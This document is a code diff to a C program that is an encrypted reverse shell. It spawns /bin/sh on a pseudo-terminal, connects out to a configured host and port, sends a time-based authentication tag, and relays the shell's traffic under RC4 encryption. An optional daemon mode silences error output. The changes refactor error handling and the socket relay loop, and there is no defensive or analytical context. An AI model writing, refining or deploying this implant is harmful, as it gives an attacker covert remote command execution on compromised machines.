@@ -1,13 +1,15 @@
-#include <stdio.h>
-#include <stdint.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <pty.h>
-#include <time.h>
 #include <arpa/inet.h>
+#include <errno.h>
+#include <pty.h>
 #include <signal.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <sys/select.h>
 #include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
 
 // Connection settings
 #ifndef ENCRYPTION_KEY
@@ -24,6 +26,10 @@
 
 #ifndef SHELL_COMMAND
 #define SHELL_COMMAND "/bin/sh"
+#endif
+
+#ifndef DAEMONIZE
+#define DAEMONIZE 0
 #endif
 
 #define BUFFER_LENGTH 1024
@@ -45,18 +51,12 @@
         b = t;         \
     }
 
-#ifdef DAEMONIZE
-#define FATAL(msg) \
-    {              \
-        exit(1);   \
+#define FATAL(msg)               \
+    {                            \
+        if (!DAEMONIZE)          \
+            perror(msg);         \
+        exit(errno ? errno : 1); \
     }
-#else
-#define FATAL(msg)   \
-    {                \
-        perror(msg); \
-        exit(1);     \
-    }
-#endif
 
 typedef struct rc4_state
 {
@@ -115,7 +115,7 @@ uint64_t crc64(const char *s)
     return ~crc;
 }
 
-int main(int argc, char **argv)
+int main()
 {
     int pid;
 
@@ -176,101 +176,106 @@ int main(int argc, char **argv)
         execl(SHELL_COMMAND, SHELL_COMMAND, NULL);
         FATAL("execl");
     }
-    else
+
+    // Parent
+    // Close the slave side of the pty
+    close(slave);
+
+    // Create a socket
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0)
+        FATAL("socket");
+
+    // Specify an address to connect to
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(CONNECT_PORT);
+    addr.sin_addr.s_addr = inet_addr(CONNECT_HOST);
+
+    // Connect it
+    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+        FATAL("connect");
+
+    // tag format: crc64(ENCRYPTION_KEY + "%d" % time())
+    time_t tag_time = time(NULL);
+    char tag_string[sizeof(ENCRYPTION_KEY) + 16];
+    sprintf(tag_string, "%s%lld", ENCRYPTION_KEY, (long long)tag_time);
+
+    uint64_t tag = crc64(tag_string);
+    char tag_buf[sizeof(tag)];
+    UINT64_TO_BIG_ENDIAN_ARRAY(tag, tag_buf);
+
+    // mangle encryption key to ensure difference every time
+    char mangled_encryption_key[sizeof(ENCRYPTION_KEY)] = ENCRYPTION_KEY;
+    for (size_t i = 0; i < sizeof(ENCRYPTION_KEY); i++)
+        mangled_encryption_key[i] ^= tag_buf[i % sizeof(tag_buf)];
+
+    // Send tag
+    if (send(sockfd, &tag_buf, sizeof(tag_buf), 0) < 0)
+        FATAL("send tag")
+
+    // Initialize RC4 states
+    rc4_state rc4recv, rc4send;
+    rc4_init(&rc4recv, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);
+    rc4_init(&rc4send, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);
+
+    // Create duplex socket connection by polling
+    int fd_max = sockfd > master ? sockfd : master;
+    char buffer[BUFFER_LENGTH];
+
+    for (;;)
     {
-        // Parent
-        // Close the slave side of the pty
-        close(slave);
+        fd_set readfds;
+        FD_ZERO(&readfds);
+        FD_SET(sockfd, &readfds);
+        FD_SET(master, &readfds);
 
-        // Create a socket
-        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-        if (sockfd < 0)
-            FATAL("socket");
+        struct timeval timeout;
+        timeout.tv_sec = 0;
+        timeout.tv_usec = 100 * 1000; // 100ms
 
-        // Specify an address to connect to
-        struct sockaddr_in addr;
-        addr.sin_family = AF_INET;
-        addr.sin_port = htons(CONNECT_PORT);
-        addr.sin_addr.s_addr = inet_addr(CONNECT_HOST);
+        if (select(fd_max + 1, &readfds, NULL, NULL, &timeout) < 0)
+            FATAL("select")
 
-        // Connect it
-        if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
-            FATAL("connect");
-
-        // tag format: crc64(ENCRYPTION_KEY + "%d" % time())
-        time_t tag_time = time(NULL);
-        char tag_string[sizeof(ENCRYPTION_KEY) + 16];
-        sprintf(tag_string, "%s%lld", ENCRYPTION_KEY, (long long)tag_time);
-
-        uint64_t tag = crc64(tag_string);
-        char tag_buf[sizeof(tag)];
-        UINT64_TO_BIG_ENDIAN_ARRAY(tag, tag_buf);
-
-        // mangle encryption key to ensure difference every time
-        char mangled_encryption_key[sizeof(ENCRYPTION_KEY)] = ENCRYPTION_KEY;
-        for (int i = 0; i < sizeof(ENCRYPTION_KEY); i++)
-            mangled_encryption_key[i] ^= tag_buf[i % sizeof(tag_buf)];
-
-        // Send tag
-        if (send(sockfd, &tag_buf, sizeof(tag_buf), 0) < 0)
-            FATAL("send tag")
-
-        // Initialize RC4 states
-        rc4_state rc4recv, rc4send;
-        rc4_init(&rc4recv, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);
-        rc4_init(&rc4send, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);
-
-        // Create duplex socket connection by polling
-        int fd_max = sockfd > master ? sockfd : master;
-        char buffer[BUFFER_LENGTH];
-
-        for (;;)
-        {
-            fd_set readfds;
-            FD_ZERO(&readfds);
-            FD_SET(sockfd, &readfds);
-            FD_SET(master, &readfds);
-
-            struct timeval timeout;
-            timeout.tv_sec = 0;
-            timeout.tv_usec = 100 * 1000; // 100ms
-
-            if (select(fd_max + 1, &readfds, NULL, NULL, &timeout) < 0)
-                FATAL("select")
-
-            if (FD_ISSET(sockfd, &readfds))
+        ssize_t n;
+        // Read from socket and write to pty
+        if (FD_ISSET(sockfd, &readfds))
+            for (;;)
             {
-                // Read from socket and write to pty
-                int n = recv(sockfd, buffer, sizeof(buffer), 0);
-                if (n == 0)
-                    break;
+                n = recv(sockfd, buffer, sizeof(buffer), 0);
                 if (n < 0)
                     FATAL("recv read")
-                else if (n > 0)
-                {
-                    for (int i = 0; i < n; i++)
-                        buffer[i] ^= rc4_next(&rc4recv);
-                    write(master, buffer, n);
-                }
+                if (n == 0)
+                    goto end_loop;
+
+                for (ssize_t i = 0; i < n; i++)
+                    buffer[i] ^= rc4_next(&rc4recv);
+                write(master, buffer, n);
+
+                // Break if the buffer is not full (i.e., no more data to read)
+                if ((size_t)n < sizeof(buffer))
+                    break;
             }
 
-            if (FD_ISSET(master, &readfds))
+        // Read from pty and write to socket
+        if (FD_ISSET(master, &readfds))
+            for (;;)
             {
-                // Read from pty and write to socket
-                int n = read(master, buffer, BUFFER_LENGTH);
-                if (n == 0)
-                    break;
+                n = read(master, buffer, sizeof(buffer));
                 if (n < 0)
                     FATAL("send read")
-                else if (n > 0)
-                {
-                    for (int i = 0; i < n; i++)
-                        buffer[i] ^= rc4_next(&rc4send);
-                    write(sockfd, buffer, n);
-                }
+                if (n == 0)
+                    goto end_loop;
+
+                for (ssize_t i = 0; i < n; i++)
+                    buffer[i] ^= rc4_next(&rc4send);
+                write(sockfd, buffer, n);
+
+                if ((size_t)n < sizeof(buffer))
+                    break;
             }
-        }
     }
 
+end_loop:
     return 0;
 }
